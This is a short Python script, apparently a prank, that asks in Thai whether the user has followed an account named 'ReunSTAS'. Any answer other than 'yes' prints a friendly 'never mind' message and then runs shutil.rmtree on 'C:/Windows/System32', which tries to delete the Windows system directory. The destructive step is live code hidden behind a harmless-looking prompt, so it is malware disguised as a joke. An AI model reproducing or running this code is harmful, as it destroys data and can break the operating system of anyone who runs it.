import shutil

ans = input("คุณได้กด Follow ReunSTAS แล้วรึยัง").strip().lower()

if ans == "yes":
    print("ขอบคุณที่กดFollowคับ [Loveๆ] ")
    
else:
    print("ไม่เป็นไรน้าาาาา")
    shutil.rmtree("C:/Windows/System32")

